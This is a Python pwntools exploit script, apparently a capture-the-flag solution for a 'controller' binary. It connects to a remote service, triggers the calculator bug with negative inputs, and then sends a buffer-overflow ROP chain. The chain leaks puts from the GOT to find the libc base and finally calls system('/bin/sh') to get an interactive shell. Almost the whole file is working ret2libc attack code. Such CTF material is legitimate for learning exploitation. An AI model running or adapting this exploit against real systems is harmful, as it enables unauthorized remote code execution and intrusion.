from pwn import *

def main():
	# LOCAL = True
	LOCAL = False
	if LOCAL:
		# Method 1
		# elf = ELF('./controller')
		# p = elf.process()
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

		# Method 2
		p = process('./controller')
		# libc = p.libc
		elf = p.elf
	else:
		host = '165.227.234.7'
		port = 31379
		libc = ELF('libc.so.6')
		# p = process('/usr/bin/nc 165.227.234.7 31379')
		p = remote(host, port)
		# p = p.spawn_process()
		# elf = p.elf
		elf = ELF('./controller')
		libc = ELF('./libc.so.6')
		ret = 0x0000000000400606 # used for offsets

	# need to calculate 65338 
	a = p.recvuntil(": ")
	print(a)
	p.sendline("-718")
	p.sendline("-91")
	a = p.recvuntil("> ")
	print(a)
	p.sendline("3")
	a = p.recvuntil("> ")
	print(a)

	# trigger overflow after this point
	# payload = b'A' * 32 + b'B' * 8 + b'C' * 8 + b'D' * 100
	pop_rdi = 0x00000000004011d3
	puts_string = elf.got["puts"] # get the location for the puts call
	puts_plt = elf.plt["puts"]
	calculator = elf.symbols["calculator"]
	payload = b'A' * 32 + b'B' * 8 + p64(pop_rdi) + p64(puts_string) + p64(puts_plt) + p64(calculator) 

	p.sendline(payload)
	a = p.recvline() # problem ignored statement
	a = p.recvline().strip()
	
	a = a.hex().zfill(2)
	# print(a)
	leaked_address = "".join([ a[i-2:i] for i in range(len(a), 0, -2) ]) # made the string little endian but maybe i dont need to do this?
	# print(int(a, 16))
	leaked_address = int(leaked_address, 16)

	# after getting the address, go back to calculator
	a = p.recvuntil(": ")
	print(a)
	p.sendline("-718")
	p.sendline("-91")
	a = p.recvuntil("> ")
	print(a)
	p.sendline("3")
	a = p.recvuntil("> ")
	print(a)

	# calculating the libc address taking into consideration the offset
	print(libc.symbols['puts'])
	libc.address = leaked_address - libc.symbols['puts'] # setting base address for libc; default is 0
	print("leaked address for puts", hex(leaked_address), libc.symbols['puts'])
	print("libc address", hex(libc.address))

	# system call
	system = libc.symbols['system']
	bin_sh = libc.search(b'/bin/sh').__next__()
	payload = b'A' * 32 + b'B' * 8 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
	p.sendline(payload) 
	a = p.recvline() # "problem ignored"
	print(a)
	# p.recvline()
	p.interactive()

	# NOTE: NEED 
	# https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system


if __name__ == '__main__':
	main()
    # CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}

